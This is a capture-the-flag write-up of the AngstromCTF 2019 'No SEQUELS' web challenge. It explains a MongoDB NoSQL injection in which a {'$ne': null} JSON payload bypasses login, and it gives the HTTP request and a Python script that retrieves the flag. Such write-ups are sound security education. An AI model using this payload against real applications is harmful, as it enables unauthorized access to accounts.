---
title: "AngstromCTF 2019 | No SEQUELS and No SEQUELS 2 Web Writeup"
author: "CHERIEF Yassine (omega_coder)"
date: 2019-04-26T01:49:01+02:00
subtitle: "Mongodb Authentification bypass and Blind Injection"
tags: ["ctf", "nosql", "mongodb", "nosql-injection", "web", "writeup"]
categories: ["writeups", "security"]
bigimg: [{"src": "https://res.cloudinary.com/https-omega-coder-github-io/image/upload/b_rgb:000000,o_20/v1556407284/Screenshot_2019-04-28_01-17-11.png", "desc": "NoSQL Injection on Mongodb"}]
---


This blog post contains the writeup for two challenges (No SEQUELS & No SEQUELS 2), because they are related.

So let's start with No SEQUELS first.

**Category:** Web  
**Points:** 50  

-----------------------------

## Challenge Description 
> The prequels sucked, and the sequels aren't much better, but at least we always have the [original trilogy](https://nosequels.2019.chall.actf.co).

> Hint said : *MongoDB is a safer alternative to SQL, right?*

#### What we can get from the informations stated above ?

- They are using MongoDB as a NoSQL engine.
- we can guess from hint that its a simple Auth bypass with MongoDB NoSQL injection.

We are presented a part of the source code of how the authentication happens.

![no_sequels_source_code](https://res.cloudinary.com/https-omega-coder-github-io/image/upload/v1556371044/1_xKB1P9_JsMbdjYLkCsnHvw.png)

### Exaplanation

This simple authentication uses `JWT` (JSON Web Tokens), trying to hack the token won't help because the JWT token is being signed with a `secret key` and we don't know the key actually.

After reading the code, this is clearly a NoSQL Injection because of unsanitized user input.

The following two lines show that the variables username and password are not sanitized by anyway.

```js
var user = req.body.username;
var pass = req.body.password;
```

One more thing to notice, the line below show that the body can be parser using json regarded that we supply some json input with `Content-Type: application/json`.

```js
app.use(bodyParser.json());
```

NoSQL databases are still potentially vulnerable to injection attacks, even if they aren't using the traditional `SQL` syntax.

The unsanitisation of username and password will lead to NoSQL code injection.  

What would happen if we post the following JSON data:

```http
POST https://nosequels.2019.chall.actf.co HTTP/1.1
Content-Type: application/json
{
    "username": {"$ne": null},
    "password": {"$ne": null}
}
```

By Sending this payload the username & password will be parsed as so, thus the query being  

```javascript
var query = {
    username: {"$ne": null};
    password: {"$ne": null};
}
    
```

Now, executing the line below from the app source code will return the first row, and we will be authenticated.  

```javascript
db.collection('users').findOne(query, function(err, user) {
    if (!user) {
        res.send("Wrong username or password");
        return 
    }
    res.cookie('token', jwt.sign({name: user.username, authnticated: true}, secret));
    res.redirect("/site");
});
```
Let's write a script to do the work for us, and get that first `FLAG`.

We will be using python requests module.  


```python
import requests
import re
URL = "https://nosequels.2019.chall.actf.co/login"
payload = '{"username": {"$ne": null}, "password": {"$ne": null}}'
cookies = {"token": "still_dont_know"} 
# we could have done it manually, and replaced the token with
# the token that your browser got for you

# init session
session = requests.Session()
# set re expression for token in headers
jwt_token_re = re.compile(r"token=(.*);")
# Getting the token for the first time

token_req = session.get(URL)
if token_req.status_code == 200:
    m = re.search(jwt_token_re, token_req.headers["Set-Cookie"])
    if m:
        # update token in cookies dict
        cookies["token"] = str(m.group(1))

    # Now let's send the json payload alongside the cookie we got above.
    # we will leave requests default behaviour to follow redirects which will redirect us to /site

flag_re = re.compile(r"actf{.*}")

# make request with mallicious payload

req = session.post(URL, json=payload, cookies=cookies, verify=False)
# verify=False is just for HTTPS connection

if req.status_code == 200:
    # FLAG match
    m = re.search(flag_re, req.text)
    if m:
        print("1st FLAG: ", m.group(0)) 
```

**`FLAG is : actf{no_sql_doesn’t_mean_no_vuln}`**




















